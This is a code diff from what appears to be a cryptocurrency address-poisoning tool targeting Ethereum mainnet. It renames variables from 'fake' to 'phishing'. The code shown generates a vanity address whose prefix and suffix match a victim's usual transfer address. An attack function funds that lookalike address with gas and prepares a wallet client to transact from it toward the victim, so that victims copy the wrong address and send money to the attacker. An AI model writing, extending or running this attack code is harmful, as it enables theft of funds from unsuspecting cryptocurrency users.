@@ -46,11 +46,11 @@ export function watchVictim() {
   );
 }
 
-// generate fake account
-export function generateFakeAccount(transferAddress) {
-  console.time("get fake address cost time");
-  let fakeAddress = "";
-  let fakePrivateKey = "";
+// generate phishing account
+export function generatePhishingAccount(transferAddress) {
+  console.time("get phishing address cost time");
+  let phishingAddress = "";
+  let phishingPrivateKey = "";
 
   const addressStart = transferAddress
     .substring(0, START_POSITION)
@@ -68,10 +68,10 @@ export function generateFakeAccount(transferAddress) {
       address.toLocaleLowerCase().startsWith(addressStart) &&
       address.toLocaleLowerCase().endsWith(addressEnd)
     ) {
-      fakeAddress = address;
-      fakePrivateKey = privateKey;
-      console.log("Found fake address: " + address);
-      console.log(`Fake address private key: ${privateKey.toString("hex")}`);
+      phishingAddress = address;
+      phishingPrivateKey = privateKey;
+      console.log("Found phishing address: " + address);
+      console.log(`Phishing address private key: ${privateKey.toString("hex")}`);
       break;
     }
 
@@ -82,13 +82,13 @@ export function generateFakeAccount(transferAddress) {
       break;
     }
   }
-  console.timeEnd("get fake address cost time");
-  return { fakeAddress, fakePrivateKey };
+  console.timeEnd("get phishing address cost time");
+  return { phishingAddress, phishingPrivateKey };
 }
 
 // attack
 export async function attack({ victimAddress, transferAddress }) {
-  const { fakeAddress, fakePrivateKey } = generateFakeAccount(transferAddress);
+  const { phishingAddress, phishingPrivateKey } = generatePhishingAccount(transferAddress);
 
   const publicClient = createPublicClient({
     chain: mainnet,
@@ -106,7 +106,7 @@ export async function attack({ victimAddress, transferAddress }) {
     transport: fallback([http(ALCHEMY_RPC)]),
   });
   const gasHash = await hackClient.sendTransaction({
-    to: fakeAddress,
+    to: phishingAddress,
     value: parseEther(GAS_VALUE),
     gasPrice: adjustedGasPrice,
   });
@@ -121,7 +121,7 @@ export async function attack({ victimAddress, transferAddress }) {
   if (gasReceipt && gasReceipt.status && gasReceipt.status === "success") {
     console.log(`send gas success`);
     const client = createWalletClient({
-      account: privateKeyToAccount(fakePrivateKey),
+      account: privateKeyToAccount(phishingPrivateKey),
       chain: mainnet,
       transport: fallback([http(ALCHEMY_RPC)]),
     });
